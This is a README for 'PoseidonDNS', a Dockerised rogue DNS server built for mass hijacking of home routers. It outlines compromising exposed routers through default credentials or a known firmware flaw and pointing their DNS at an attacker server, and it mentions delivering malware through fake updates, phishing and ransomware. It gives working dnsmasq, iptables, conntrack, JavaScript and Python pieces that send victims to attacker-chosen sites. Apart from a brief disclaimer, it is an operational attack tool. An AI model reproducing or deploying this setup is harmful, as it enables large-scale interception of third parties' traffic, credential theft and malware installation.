[![Maintenance](https://img.shields.io/badge/Maintained-yes-green.svg)]() [![Powered by](https://img.shields.io/badge/ubuntu-v16.04-blue.svg)]() [![Docker](https://img.shields.io/badge/DockerImage-v1.0.1-green.svg)](https://hub.docker.com/repository/docker/benchaliah/poseidondns)

## Disclaimer

This tutorial is for informational and educational purposes only. I believe that ethical hacking, information security and cyber security should be familiar subjects to anyone using digital information and computers. And I urge anyone who would use this tool to only use it on targets he/she is authorized to access, I hold no responsability in one used it for any unlawful activity.


## About

* This is a tool that can offer a cross-platform (Android, Windows, iOS ... etc) remote and automated penetration, can be used for massive automated social engineering, randomware or more advanced pentests


[DNS hijacking](https://en.wikipedia.org/wiki/DNS_hijacking) is often used for phishing, in order to obtain sensitive information such as credentials for social media and bank accounts, but more advanced exploitation allows for more critical access. Let take the following scenario for instance, if a hacker gain access to the DNS settings in a router, he can in theory then control the entire flow of the target's internet connections, therefore, he can install malwares on the target's devices (smartphone, computer) using social engineering (fake updates, because normal updates done automatically by windows, android or otherwise are almost exlucsivly done via SSL which would require a signed certificate) or some vulnerability in the software already installed on the target's device. However, this process require investing significant time analyzing each target indivually and trying to gain more access.


## Setup

> Must be root

* __Method 1:__

Clone this repo then :
```
$ docker build -t poseidon .
$ docker run -it  --privileged --cap-add=ALL -v /lib/modules:/lib/modules -p 81:80 -p 5353:53 poseidon
```

* __Method 2:__

Pull from docker :
```
$ docker pull benchaliah/poseidondns
$ docker run -it  --privileged --cap-add=ALL -v /lib/modules:/lib/modules -p 81:80 -p 5353:53 benchaliah/poseidondns
```


## Approach

One of ways this tools can be used in, is using Nmap to scan massive IP ranges looking for routers that are exposed to WAN, most of them usually still hold the default login (example: user=admin pass=admin) then changing the DNS address in the DHCP settings, this process can be easily automated using a simple Python script and by using http requests or a Browser automation library (example: Selenium/Chromedriver-FirefoxDriver) you can automatically gain access to thousands of routers, there is also [Shodan](http://shodan.io) that can offer huge numbers of active IPs of routers that are exposed and you can even uses more filters to get only routers that uses a specific firmware/version on which you have a way to access even without default credentials (example : Millions of routers around the world uses Rompager/4.07 a firmware that have a critical vulnerability called [Misfortune Cookie](https://github.com/BenChaliah/MIPS-CVE-2014-9222)).
However, setting thousands of routers towards your DNS similtanously raises another question, how much resources would the server require? The server must respond to the millions of requests each minutes withing few miliseconds for each request, so that the targets wouldn't notice a difference in latency in their internet connection, one of the tools known in the cyber security community for DNS hijacking called DNSChef, a tool that is built on python, which makes it very useful in the case of small sample testing but highly unreliable when you test it against much bigger samples giving high failure rate. On the other hand there's dnsmasq which is written in C (making it much much faster with very little resources) and it offers DNS caching, a DHCP server and more. But since it was not intended for DNS Hijacking it's not quite configurable for such use.

However, in this analysis I'll be explain how did I used it and other low level tools to make a server that even with very low specs (Example : Elastic computer hosted on AWS or gCloud 1 vcpu, 1 Gb of memory) can offer for a huge number of targets a very low latency that compares to that of known public DNS such as `8.8.8.8`, or even supersede it depending on the location of the server and the targets.


### Tools
```
 > dnsmasq 2.79 (or later)
 > Apache/2.4.29 (Ubuntu)
 > conntrack v1.4 (or later)
 > iptables v1.6.1 (or later)
 > python2.7
 > screen version 4.06 (or later)
```

## Summary

* Component 1:

You start two (or more depending on the exploitation) instances of dnsmasq and bind them to different ports

```
$ dnsmasq --no-hosts -p 531 --max-cache-ttl=0
$ dnsmasq --no-hosts --address=/#/yourDNSIP  --server=/.youWebsiteDomain.tld/# -p 532 --max-cache-ttl=0
```

the first one in a regular resolver in order to provide the real DNS records, and the second one will always return an `A record` with the IP address of the server you deploy this docker on except for the domain (or domains, by adding `--server=/.domain2/#`) to which you want to force the targets

* Component 2:

We will be adding the some rules to `NAT` table, the idea is to forward connections comming through port 53 (UDP and TCP, but mainly the former) to either of the dnsmasq instances, and the way to do so is by putting the rule in __PREROUTING__ chain specification, first we'll forward all connections towards the DNS that would provide the __fake records__

```
$ iptables -t nat -A PREROUTING -p tcp -m tcp --dport 53 -j REDIRECT --to-port 532
$ iptables -t nat -A PREROUTING -p udp -m udp --dport 53 -j REDIRECT --to-port 532
```

after the target get redirecred to the domain you which or download the software you wants, you need to trigger the process that will add an exception for the associated __REMOTE_ADDR__ in the port forwarding rules. Here's an example using Javascript, implemented in your domain page

```javascript
<script type="text/javascript">
	if (document.visibilityState == "visible") {
		var xhttp = new XMLHttpRequest();
		xhttp.open("GET", "http://myDNSIP/cgi-bin/route", true);
		xhttp.send();
	}
</script>
```

the previous script will trigger the execution of a Python script inside cgi-bin. Now the script does multiple things but all are very lightweight, first create an empty file called __{REMOTE_ADDR}__ inside a folder called __IPS__, for instance, if the request came from `174.123.23.54` their will be a file called `174.123.23.54` inside IPS, then it'll generate a bash script that will be executed and delete itself when finished (by adding this command `rm -f -- "$0"` at the end). the bash contains also multiple iptables rules, which are the exceptions for all the targets that already went through the process:

```python
for i in os.listdir("./ips/") + [os.environ['REMOTE_ADDR']]:
	rules_str += "-A PREROUTING -s %s/32 -p udp -m udp --dport 53 -j REDIRECT --to-ports 531\n"%i

# Then save the exceptions in a file inside a folder
rules_path = "./tmp/script_%d.rules"%rand_name
with open(rules_path, "w") as f:
	f.write(base_query_str.replace("{loop_str}", rules_str))
```

An independant Python script running in a screen must update iptables rules every few miliseconds through 

`cat ./tmp/script_{rand_name}.rules | iptables-restore`

In order to improve efficiency and avoid running the same exceptions multiple times the independ Python script (or any other approach to loop this command) will be running:

`cat $(ls -1t /var/www/cgi-bin/tmp/*.rules | head -1) | iptables-restore`

the first part of the command will read the latest created rules file which will hold the previously generated rules without duplicates then pipe it to `iptables-restore`.



* Component 3:

Let assume you want the targets to get redirected to your website/domain periodically (the period can be constant or variate), this is were `runScreen1.py` comes to play, you also run this script in an independant screen, the script will run:

> rand_int holds the same value as the one in the file /var/www/cgi-bin/rand_ref which can variate or be constant (depending on your exploitation)

`$ cd /var/www/cgi-bin/ips && find * -mmin +{rand_int} -exec  conntrack -D -s {} > /dev/null \; && find * -mmin +{rand_int} -exec rm -f {} \; && cd /root`

Let now disect this command, `find * -mmin +{rand_int} -exec` uses the filesystem to select only the files (here IPs) that where created/modified at least __{rand_int}__ minutes ago, for instance if you want to redirect the targets each hour you just need to put 60 inside `/var/www/cgi-bin/rand_ref` file and this will remove the exception from the port forwarding rules by deleting the IP from `cgi-bin/ips`, by consequence the next rules file generated by `cgi-bin/route` will not be containing an exception rule for this IP. Now `-exec` will pipe the listed IPs fiting the criteria to another command `conntrack`.


* Component 2-3 (__conntrack__):

Connection tracking is a core feature of the Linux kernel's networking stack. It allows the kernel to keep track of all logical network connections or flows, and thereby identify all of the packets which make up each flow so they can be handled consistently together. However, as much as this feature allows for a smooth flow of packets at a very low level, for the purpose of this exploitation it has a small down side that can easily be dealt with (I wouldn't say a down side because connection tracking is essential for a DNS server low latency and efficiency), when ever you update the iptables rules the already established connections will not abide by the new rules which is a big problem in this specific situation, because what we want is for the target to be switched between different dnsmasq instances instantly after a specific trigger (like http request to `cgi-bin/route`).

> `conntrack -D -s`

This command will flush the existing expectations (connection trackers) based on the source address, which by consequence will force the kernel to establish a new connection based on the updated rules. We are running this command in bash generated by `cgi-bin/route` to switch the target between the fake DNS to the real one, and vice versa using `runScreen1.py`



> * I'll soon be adding a video showing how the server works, and a benchmark.
